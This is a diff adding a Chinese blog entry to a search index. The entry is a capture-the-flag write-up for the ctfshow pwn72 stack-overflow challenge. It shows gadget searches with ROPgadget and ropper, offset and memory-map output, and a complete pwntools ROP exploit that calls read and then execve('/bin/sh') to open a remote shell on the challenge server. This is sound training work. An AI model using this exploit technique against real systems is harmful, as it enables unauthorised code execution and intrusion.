@@ -663,4 +663,106 @@
         <tag>CTF - PWN - 网络安全</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ctfshow pwn入门 pwn72</title>
+    <url>/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn72/</url>
+    <content><![CDATA[<h2 id="pwn72"><a href="#pwn72" class="headerlink" title="pwn72"></a>pwn72</h2><p><a href="https://ctf.show/challenges#pwn72-4082">ctf.show pwn72</a></p>
+<!--read-->
+
+<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul>
+<li><a href="#jump1">题目</a></li>
+<li><a href="#jump2">预计时间</a></li>
+<li><a href="#jump3">题目分析及截图</a></li>
+</ul>
+<hr>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id="jump1">题目</a></h4><img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn72/1.png" class="" title="This is an image">
+
+<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id="jump2">预计时间</a></h4><p>2h</p>
+<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a id="jump3">题目分析及截图</a></h4><p>我们先<code>checksec ./pwn</code>查看程序的保护机制</p>
+<img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn72/2.png" class="" title="This is an image">
+
+<p>开启了<code>NX</code>不可执行机制，我们可以使用gadget构造payload来写这道题</p>
+<p>查看 <strong>main函数</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+10h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;CTFshow-PWN&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;where is my system?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Emmm&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>gets(&amp;v4);</code>依旧是很明显的栈溢出漏洞</p>
+<p>那么我们先看一下程序的 <strong>偏移</strong> 是多少</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l 0x6161616c</span><br><span class="line">Finding cyclic pattern of 4 bytes: b<span class="string">&#x27;laaa&#x27;</span> (hex: 0x6c616161)</span><br><span class="line">Found at offset 44</span><br></pre></td></tr></table></figure>
+
+<p>如果你不知道<strong>cyclic</strong>怎么使用，建议看一下pwn71这篇，或者自己去搜索一篇好的博客学习一下</p>
+<p>看看程序中有没有<code>&quot;/bin/sh&quot;</code></p>
+<p>使用<code>ROPgadget --binary pwn --string &quot;/bin/sh&quot;</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn72$ ROPgadget --binary pwn --string <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>很明显没有”&#x2F;bin&#x2F;sh”，那么如果我们想使用syscall来写这道题的话，execve(“&#x2F;bin&#x2F;sh”)是一定会构造的，那没有<code>&quot;/bin/sh&quot;</code>怎么能行？</p>
+<p>我们可以进行两个系统调用：</p>
+<ul>
+<li>read(fd,addr,len)</li>
+<li>execve(“&#x2F;bin&#x2F;sh”,0,0)</li>
+</ul>
+<p>为了解决<code>&quot;/bin/sh&quot;</code>这个问题，我们可以使用read来将<code>&quot;/bin/sh&quot;</code>写入。但是想用系统调用，我们需要找一些我们能用的<code>gadget片段</code>。</p>
+<ul>
+<li><code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep eax</code></li>
+<li><code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep ebx</code></li>
+<li><code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep ecx</code></li>
+<li><code>ROPgadget --binary pwn --only &quot;pop|ret&quot; | grep edx</code></li>
+</ul>
+<p>但是当我找<code>ecx</code>寄存器的时候，我发现，如果想要单独的<code>pop ecx; ret</code></p>
+<p>是找不到的，但是我找到了另一个可以用的</p>
+<img src="/2025/11/24/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn72/3.png" class="" title="This is an image">
+
+<p>如果使用这条gadget，那我们直接使用这一条+eax那一条就够用了，非常方便</p>
+<p>通过这些命令，找到gadget的地址为：</p>
+<ul>
+<li><code>eax：</code>0x080bb2c6</li>
+<li><code>edx_ecx_ebx：</code>0x0806ecb0</li>
+</ul>
+<p>除此之外我们还需要<code>int 0x80; ret</code>的地址</p>
+<p><strong>需要注意为什么这里要加ret，但是上一题不需要加ret：</strong></p>
+<ul>
+<li>在pwn71这道题目中我们直接使用<code>int 0x80</code>就可以了，是因为我们使用的是execve系统调用，<strong>execve 成功后不会返回用户态</strong>，执行流直接跳到新进程（&#x2F;bin&#x2F;sh）</li>
+<li>而在pwn72本道题中，我们需要使用<code>int 0x80; ret</code>，read 系统调用执行完后，CPU 会从你构造的 syscall 指令<strong>紧接着的地址继续执行</strong>，如果你只放 <code>int 0x80</code>，那系统调用之后 CPU 会跑到 <strong>你无法控制的下一条指令</strong>，所以你必须让它执行到一个受控“ret”，回到 ROP 链继续执行</li>
+<li>除了execve 和 exit可以直接使用<code>int 0x80</code>其他的系统调用都要使用<code>int 0x80; ret</code></li>
+</ul>
+<p>我们使用命令来查找该gadget</p>
+<ol>
+<li><p><code>ROPgadget --binary pwn --only &quot;int&quot;</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn72$ ROPgadget --binary pwn --only <span class="string">&quot;int&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080891d5 : int 0xcf</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 2</span><br></pre></td></tr></table></figure>
+
+<p>这个里并没有符合我们要求的地址。</p>
+<p>我一瞬间不知道怎么做了，去问了群里的大佬，才知道还有一个命令<code>poper</code>找的更全</p>
+</li>
+<li><p><code>ropper --file pwn --search &quot;int 0x80&quot;</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn72$ ropper --file pwn --search <span class="string">&quot;int 0x80&quot;</span></span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: int 0x80</span><br><span class="line"></span><br><span class="line">[INFO] File: pwn</span><br><span class="line">0x08049421: int 0x80; </span><br><span class="line">0x0806f350: int 0x80; ret; </span><br></pre></td></tr></table></figure>
+
+<p>找到了！！！！</p>
+</li>
+</ol>
+<p><strong>int 0x80; ret;</strong> 的地址是：<code>0x0806f350</code></p>
+<p>我们先解决 <strong>read</strong> 这个系统调用的payload</p>
+<p>再调用之前，我们还需要知道”&#x2F;bin&#x2F;sh”写入哪一个段地址中，这就需要使用<code>vmmap</code>命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">     Start        End Perm     Size  Offset File (<span class="built_in">set</span> vmmap-prefer-relpaths on)</span><br><span class="line"> 0x8048000  0x80e9000 r-xp    a1000       0 pwn</span><br><span class="line"> 0x80e9000  0x80eb000 rw-p     2000   a0000 pwn</span><br><span class="line"> 0x80eb000  0x80ed000 rw-p     2000       0 [anon_080eb]</span><br><span class="line"> 0x80ed000  0x810f000 rw-p    22000       0 [heap]</span><br><span class="line">0xf7ff8000 0xf7ffa000 r--p     2000       0 [vvar]</span><br><span class="line">0xf7ffa000 0xf7ffc000 r--p     2000       0 [vvar_vclock]</span><br><span class="line">0xf7ffc000 0xf7ffe000 r-xp     2000       0 [vdso]</span><br><span class="line">0xfffdd000 0xffffe000 rw-p    21000       0 [stack]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x80e9000  0x80eb000 rw-p     2000   a0000 pwn</span><br><span class="line"> 0x80eb000  0x80ed000 rw-p     2000       0 [anon_080eb]</span><br><span class="line"> 0x80ed000  0x810f000 rw-p    22000       0 [heap]</span><br></pre></td></tr></table></figure>
+
+<p>这三个段地址都是可写的，我们可以随意选择一个地址（bss），作为填写<code>/bin/sh</code>的地址</p>
+<ul>
+<li><p>read(fd , addr , len)</p>
+<p>因为我们是从stdin中输入”&#x2F;bin&#x2F;sh”的，所以我们的fd就应该等于0</p>
+<p>那么addr就应该是我们写入”&#x2F;bin&#x2F;sh”段的地址</p>
+<p>如果我们值写入”&#x2F;bin&#x2F;sh”的话，8是够的，或者你可以更长</p>
+</li>
+<li><p>execve(“&#x2F;bin&#x2F;sh”,0,0)</p>
+<p>只不过因为我们的<code>&quot;/bin/sh&quot;</code>写到bss里面了，那么第一个参数就是bss的地址</p>
+</li>
+</ul>
+<p><strong>exp如下</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28137</span>)</span><br><span class="line">eax = <span class="number">0x080bb2c6</span></span><br><span class="line">edx_ecx_ebx = <span class="number">0x0806ecb0</span></span><br><span class="line">bss = <span class="number">0x80ea000</span></span><br><span class="line">int_0x80 = <span class="number">0x0806F350</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">44</span> * <span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload += p32(eax)</span><br><span class="line">payload += p32(<span class="number">0x3</span>)</span><br><span class="line">payload += p32(edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">8</span>)</span><br><span class="line">payload += p32(bss)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(int_0x80)</span><br><span class="line">payload += p32(eax) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bss) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">binsh = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">p.sendline(binsh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+]]></content>
+      <tags>
+        <tag>CTF - PWN - 网络安全</tag>
+      </tags>
+  </entry>
 </search>
